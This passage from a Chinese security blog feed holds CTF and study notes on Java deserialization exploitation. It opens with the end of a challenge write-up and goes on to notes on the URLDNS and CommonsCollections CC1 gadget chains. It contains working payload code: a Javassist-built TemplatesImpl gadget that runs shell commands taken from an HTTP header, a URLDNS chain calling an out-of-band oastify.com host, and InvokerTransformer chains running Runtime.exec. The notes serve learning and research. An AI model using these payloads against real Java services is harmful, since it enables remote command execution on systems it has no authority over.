ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));</span><br><span class="hljs-comment">            oos.writeObject(obj);</span><br><span class="hljs-comment">        &#125;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">        public static Object unserialize(String Filename) throws IOException,ClassNotFoundException&#123;</span><br><span class="hljs-comment">            ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));</span><br><span class="hljs-comment">            Object obj = ois.readObject();</span><br><span class="hljs-comment">            return obj;</span><br><span class="hljs-comment">        &#125;*/</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> CtClass <span class="hljs-title function_">genPayloadForLinux2</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> NotFoundException, CannotCompileException &#123;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">classPool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> classPool.makeClass(<span class="hljs-string">&quot;A&quot;</span>);<br>        <span class="hljs-keyword">if</span> ((clazz.getDeclaredConstructors()).length != <span class="hljs-number">0</span>) &#123;<br>            clazz.removeConstructor(clazz.getDeclaredConstructors()[<span class="hljs-number">0</span>]);<br>        &#125;<br>        clazz.addConstructor(CtNewConstructor.make(<span class="hljs-string">&quot;public spring() throws Exception &#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;                org.springframework.web.context.request.RequestAttributes requestAttributes = org.springframework.web.context.request.RequestContextHolder.getRequestAttributes();\n&quot;</span> +<br>                <span class="hljs-string">&quot;                javax.servlet.http.HttpServletRequest httprequest = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getRequest();\n&quot;</span> +<br>                <span class="hljs-string">&quot;                javax.servlet.http.HttpServletResponse httpresponse = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getResponse();\n&quot;</span> +<br>                <span class="hljs-string">&quot;                String[] cmd =  new String[]&#123;\&quot;sh\&quot;, \&quot;-c\&quot;, httprequest.getHeader(\&quot;C\&quot;)&#125;;\n&quot;</span> +<br>                <span class="hljs-string">&quot;                byte[] result = new java.util.Scanner(new ProcessBuilder(cmd).start().getInputStream()).useDelimiter(\&quot;\\\\A\&quot;).next().getBytes();\n&quot;</span> +<br>                <span class="hljs-string">&quot;                httpresponse.getWriter().write(new String(result));\n&quot;</span> +<br>                <span class="hljs-string">&quot;                httpresponse.getWriter().flush();\n&quot;</span> +<br>                <span class="hljs-string">&quot;                httpresponse.getWriter().close();\n&quot;</span> +<br>                <span class="hljs-string">&quot;        &#125;&quot;</span>, clazz));<br>        <span class="hljs-comment">// 兼容低版本jdk</span><br>        clazz.getClassFile().setMajorVersion(<span class="hljs-number">50</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> classPool.get(AbstractTranslet.class.getName());<br>        clazz.setSuperclass(superClass);<br>        <span class="hljs-keyword">return</span> clazz;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> TemplatesImpl <span class="hljs-title function_">getTemplate</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clz</span> <span class="hljs-operator">=</span> genPayloadForLinux2();<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(obj, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;clz.toBytecode()&#125;);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后执行命令就行：</p><p><img src="/img/polaroa_18.png" alt="polaroa_18"></p><h3 id="0x03结语"><a href="#0x03结语" class="headerlink" title="0x03结语"></a>0x03结语</h3><p>😟java学习任重而道远</p>]]></content>
    
    
    
    <tags>
      
      <tag>做题记录</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java安全初探_CC链笔记</title>
    <link href="/2024/04/27/BUUCTF10/"/>
    <url>/2024/04/27/BUUCTF10/</url>
    
    <content type="html"><![CDATA[<p>一些java反序列化相关的学习笔记</p><span id="more"></span><p>参考了挺多师傅的文章😀这里只做简单整理，详细内容推荐这位师傅：</p><p><a href="https://drun1baby.top/">Java</a></p><h2 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h2><p>调用顺序：</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xl">H<span class="hljs-function"><span class="hljs-title">ashMap</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">readObject</span> -&gt;</span><br>  H<span class="hljs-function"><span class="hljs-title">ashMap</span>.putVal -&gt;</span><br>H<span class="hljs-function"><span class="hljs-title">ashMap</span>.hash -&gt;</span><br>URLS<span class="hljs-function"><span class="hljs-title">treamHandler</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">hashCode</span>() -&gt;</span><br>URLS<span class="hljs-function"><span class="hljs-title">treamHandler</span>-&gt;</span>getHostAddress()<br></code></pre></td></tr></table></figure><p>简单跟一下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java">    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span><br>        <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-comment">//省略一些</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; mappings; i++) &#123;<br>                <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>                    <span class="hljs-type">K</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> (K) s.readObject();<br>                <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>                    <span class="hljs-type">V</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> (V) s.readObject();<br>                putVal(hash(key), key, value, <span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>);<br><br><span class="hljs-comment">//--------------------------------------------------------</span><br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hash</span><span class="hljs-params">(Object key)</span> &#123;<br>        <span class="hljs-type">int</span> h;<br>        <span class="hljs-keyword">return</span> (key == <span class="hljs-literal">null</span>) ? <span class="hljs-number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="hljs-number">16</span>);<br>    &#125;<span class="hljs-comment">//注意这个key</span><br><span class="hljs-comment">//---------------------------------------------------------</span><br><span class="hljs-comment">//URL.java</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hashCode</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">if</span> (hashCode != -<span class="hljs-number">1</span>)<br>            <span class="hljs-keyword">return</span> hashCode;<br><br>        hashCode = handler.hashCode(<span class="hljs-built_in">this</span>);<br>        <span class="hljs-keyword">return</span> hashCode;<br>    &#125;<br><span class="hljs-comment">//----------------------------------------------------------</span><br><span class="hljs-keyword">transient</span> URLStreamHandler handler;<br><span class="hljs-comment">//----------------------------------------------------------</span><br><span class="hljs-comment">//URLStreamHandler.java</span><br><span class="hljs-keyword">protected</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hashCode</span><span class="hljs-params">(URL u)</span> &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">h</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">protocol</span> <span class="hljs-operator">=</span> u.getProtocol();<br>        <span class="hljs-keyword">if</span> (protocol != <span class="hljs-literal">null</span>)<br>            h += protocol.hashCode();<br><br>        <span class="hljs-type">InetAddress</span> <span class="hljs-variable">addr</span> <span class="hljs-operator">=</span> getHostAddress(u);<br><span class="hljs-comment">//getHostAddress</span><br>        <span class="hljs-keyword">protected</span> <span class="hljs-keyword">synchronized</span> InetAddress <span class="hljs-title function_">getHostAddress</span><span class="hljs-params">(URL u)</span> &#123;<br>        <span class="hljs-keyword">if</span> (u.hostAddress != <span class="hljs-literal">null</span>)<br>            <span class="hljs-keyword">return</span> u.hostAddress;<br></code></pre></td></tr></table></figure><p><code>put</code>方法里的<code>key</code>放个URL，<code>put</code>触发同类下的<code>hash</code>方法<code>hash</code>方法触发同类下的<code>key.hashcode</code>，现在这个key是URL类的一个实例。其实就是调用了<code>URL.java</code>下的<code>hashCode</code>方法。<code>hashCode(this)</code>这里的<code>this</code>是调用该<code>hashCode</code>方法的对象本身，就是刚才那个URL实例。最终调用<code>getHostAddress</code>发起一个DNS请求。</p><p>初步<code>EXP</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs JAVA">HashMap&lt;URL,Integer&gt; hashmap= <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;URL,Integer&gt;();   <br>hashmap.put(<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;dnslog生成的URL&quot;</span>),<span class="hljs-number">1</span>);<br><br>serialize(hashmap);<br></code></pre></td></tr></table></figure><p>这时会发现<code>put</code>的时候就能发起DNS查询，而不是反序列化，问题出在：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//HashMap.java</span><br><span class="hljs-keyword">public</span> V <span class="hljs-title function_">put</span><span class="hljs-params">(K key, V value)</span> &#123;<br>      <span class="hljs-keyword">return</span> putVal(hash(key), key, value, <span class="hljs-literal">false</span>, <span class="hljs-literal">true</span>);<br>  &#125;<br><span class="hljs-comment">//URL.java</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hashCode</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-keyword">if</span> (hashCode != -<span class="hljs-number">1</span>)<br>          <span class="hljs-keyword">return</span> hashCode;<br><br>      hashCode = handler.hashCode(<span class="hljs-built_in">this</span>);<br>      <span class="hljs-keyword">return</span> hashCode;<br>  &#125;<br></code></pre></td></tr></table></figure><p>这里如果<code>hashCode</code>不等于-1的话就会走我上面写那段链子(而一开始定义<code> HashMap</code> 类的时候<code>hashCode</code>的初始值就是-1，相当于我们利用<code>put</code>里的<code>hash</code>做开头走完了这条链子，而不是利用<code>readObject</code>里的hash)。这里我们需要通过反射，目的是put时hashcode不等于-1，反序列化时等于-1：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br> <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;aa&quot;</span>,<span class="hljs-number">22</span>);  <br> HashMap&lt;URL,Integer&gt; hashmap= <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;URL,Integer&gt;();  <br> <span class="hljs-comment">// 这里不要发起请求  </span><br> <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://bl00nzimnnujskz418kboqxt9kfb30.oastify.com&quot;</span>); <br> <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> url.getClass();  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">hashcodefile</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;hashCode&quot;</span>);  <br> hashcodefile.setAccessible(<span class="hljs-literal">true</span>);  <br> hashcodefile.set(url,<span class="hljs-number">1234</span>);<span class="hljs-comment">//这里只要不是-1就行</span><br> hashmap.put(url,<span class="hljs-number">1</span>);  <br> <span class="hljs-comment">// 这里把 hashCode 改为 -1； 通过反射的技术改变已有对象的属性  </span><br> hashcodefile.set(url,-<span class="hljs-number">1</span>); <span class="hljs-comment">//这里改成-1，触发hashCode下的handler.hashCode(this);</span><br> serialize(hashmap);  <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="CC1"><a href="#CC1" class="headerlink" title="CC1"></a>CC1</h2><p>初步写一下调用顺序：</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs livescript">Invokertransformer.transform -&gt;<br>   <span class="hljs-function"><span class="hljs-params">(TransformedMap.java)</span>-&gt;</span>checksetvalue方法<br>  (TransformedMap.java)valueTransformer.transform -&gt;<br><span class="hljs-function"><span class="hljs-params">(TransformedMap.java的构造函数)</span> -&gt;</span>定义了这个valueTransformer，但构造方法的作用域是protected，要想办法找别的方法去调用这个构造方法从而让这个valueTransformer可控<br>(这里找到了同类下的decorate方法，这个方法里直接<span class="hljs-keyword">new</span>了一个TransformedMap对象，都实例化对象了肯定会调用它的构造方法)<br></code></pre></td></tr></table></figure><p>执行命令的地方就是这个<code>Invokertransformer</code>下的<code>transform</code>方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//InvokerTransformer.java</span><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">transform</span><span class="hljs-params">(Object input)</span> &#123;<br>        <span class="hljs-keyword">if</span> (input == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Class</span> <span class="hljs-variable">cls</span> <span class="hljs-operator">=</span> input.getClass();<br>            <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> cls.getMethod(iMethodName, iParamTypes);<br>            <span class="hljs-keyword">return</span> method.invoke(input, iArgs);<br><span class="hljs-comment">//看下这些参数：</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">InvokerTransformer</span><span class="hljs-params">(String methodName, Class[] paramTypes, Object[] args)</span> &#123;<br>        <span class="hljs-built_in">super</span>();<br>        iMethodName = methodName;<br>        iParamTypes = paramTypes;<br>        iArgs = args;<br></code></pre></td></tr></table></figure><p>利用这两个东西弹个计算器：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//Runtime.getRuntime().exec(&quot;calc&quot;);</span><br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  <br>  <br><span class="hljs-keyword">import</span> java.lang.reflect.Method;  <br>  <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">InvokeTransformerTest</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;  <br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> Runtime.getRuntime();  <br> <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;  <br>                , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;);  <br> invokerTransformer.transform(runtime);  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p>其实就是修改了利用反射弹计算器的代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.omg.SendingContext.RunTime;  <br>  <br><span class="hljs-keyword">import</span> java.lang.reflect.Method;  <br>  <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">InvokeTransformerTest</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> Runtime.getRuntime();  <br> <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Runtime.class;  <br> <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> c.getDeclaredMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class);  <br> method.setAccessible(<span class="hljs-literal">true</span>);  <br> method.invoke(runtime, <span class="hljs-string">&quot;calc&quot;</span>);  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p>然后寻找同名函数的不同调用：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//TransformedMap.java下存在</span><br>    <span class="hljs-keyword">protected</span> Object <span class="hljs-title function_">checkSetValue</span><span class="hljs-params">(Object value)</span> &#123;<br>        <span class="hljs-keyword">return</span> valueTransformer.transform(value);<br>    &#125;<br></code></pre></td></tr></table></figure><p>注意这个<code>checkSetValue</code>方法！其实就是把<code>invokertransformer</code>换成了<code>valueTransformer</code>，然后<code>value</code>放个实例化后的<code>Runtime</code>。看看这东西能否完美替换<code>invokertransformer</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//构造函数</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-title function_">TransformedMap</span><span class="hljs-params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;<br>        <span class="hljs-built_in">super</span>(map);<br>        <span class="hljs-built_in">this</span>.keyTransformer = keyTransformer;<br>        <span class="hljs-built_in">this</span>.valueTransformer = valueTransformer;<br>    &#125;<br></code></pre></td></tr></table></figure><p>然后<code>public</code>修饰的<code>decorate</code>就能直接<code>new</code>一个<code>TransformedMap</code>对象：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Map <span class="hljs-title function_">decorate</span><span class="hljs-params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;<br>     <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformedMap</span>(map, keyTransformer, valueTransformer);<br> &#125;<br></code></pre></td></tr></table></figure><p>截止到目前的思路：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">TransformedMap.decorate -&gt; 通过<span class="hljs-keyword">new</span>一个实例<br>    调用TransformedMap的构造方法 - &gt; 从而定义valueTransformer<br>    调用TransformedMap的checksetValue -&gt;<br>    调用valueTransformer.transform(value)<br><br>说白了就是换条路调用transform方法:<br>本来是invokerTransformer.transform(runtime)，现在是从TransformedMap.java下走过去<br></code></pre></td></tr></table></figure><p><code>EXP</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs JAVA"><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;  <br>  <br><span class="hljs-keyword">import</span> java.lang.reflect.Method;  <br><span class="hljs-keyword">import</span> java.util.HashMap;  <br><span class="hljs-keyword">import</span> java.util.Map;  <br>  <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">decorateCalc</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> Runtime.getRuntime();  <br> <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>  <br> , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;);  <br> HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();  <br> <span class="hljs-type">Map</span> <span class="hljs-variable">decorateMap</span> <span class="hljs-operator">=</span> TransformedMap.decorate(hashMap, <span class="hljs-literal">null</span>, invokerTransformer);  <br> Class&lt;TransformedMap&gt; transformedMapClass = TransformedMap.class;  <br> <span class="hljs-type">Method</span> <span class="hljs-variable">checkSetValueMethod</span> <span class="hljs-operator">=</span> transformedMapClass.getDeclaredMethod(<span class="hljs-string">&quot;checkSetValue&quot;</span>, Object.class);  <br> checkSetValueMethod.setAccessible(<span class="hljs-literal">true</span>);  <br> checkSetValueMethod.invoke(decorateMap, runtime);  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p>接下来是哪里调用了这个<code>checkSetValue</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//AbstractInputCheckedMapDecorator.java</span><br><span class="hljs-comment">//同时要注意这东西是TransformedMap的父类</span><br><br><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object value)</span> &#123;<br>            value = parent.checkSetValue(value);<br>            <span class="hljs-keyword">return</span> entry.setValue(value);<br>        &#125;<br><span class="hljs-comment">//实际上就是在 Map 中对一组 entry（键值对）进行 setValue() 操作</span><br></code></pre></td></tr></table></figure><p>再往上跟：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//AbstractMapEntryDecorator.java</span><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object object)</span> &#123;<br>        <span class="hljs-keyword">return</span> entry.setValue(object);<br>    &#125;<br></code></pre></td></tr></table></figure><p><code>setValue()</code> <strong>实际上就是在 Map 中对一组 entry（键值对）</strong>进行 <code>setValue()</code> 操作。</p><p>还往上跟：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//Map.java</span><br>V <span class="hljs-title function_">setValue</span><span class="hljs-params">(V value)</span>;<br></code></pre></td></tr></table></figure><p>先看下<code>POC</code>怎么写：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SetValueTest01</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;  <br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> Runtime.getRuntime();  <br> <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>  <br> , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;);  <br> HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();  <br> hashMap.put(<span class="hljs-string">&quot;key&quot;</span>, <span class="hljs-string">&quot;value&quot;</span>);  <br> Map&lt;Object, Object&gt; decorateMap = TransformedMap.decorate(hashMap, <span class="hljs-literal">null</span>, invokerTransformer);  <br> <span 